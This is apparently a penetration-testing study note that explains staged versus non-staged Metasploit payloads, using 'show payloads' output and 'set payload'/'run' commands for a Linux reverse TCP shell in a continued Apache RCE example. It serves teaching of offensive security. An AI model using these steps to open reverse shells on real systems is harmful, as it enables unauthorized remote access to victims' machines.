# Fundamentals

## Payload Types

- Non-staged - The payload is sent in its entirety along with the exploit. These are generally more stable but larger in size.
- Staged - The payload is usually sent in two parts. The first part contains the primary payload that causes the victim machine to connect back to the attacker, transfer a larger payload containing the rest of the shellcode, and then executing it.

```bash
# Continuation of Apache rce example
show payloads
Compatible Payloads
===================

   #   Name                                              Disclosure Date  Rank    Check  Description
   -   ----                                              ---------------  ----    -----  -----------
...
   15  payload/linux/x64/shell/reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Stager
...
   20  payload/linux/x64/shell_reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Inline
...
```

In metasploit, the "/" character is used to denote whether a payload is staged or not, so *shell_reverse_tcp* at index 20 is not staged, whereas *shell/reverse_tcp* at index 15 is.

Attempting the same exploit with a staged payload instead reveals the stage is only 38 bytes in size, making it a great choice when attempting to exploit a vulnerability with space constraints.

```bash
set payload 15
run
```
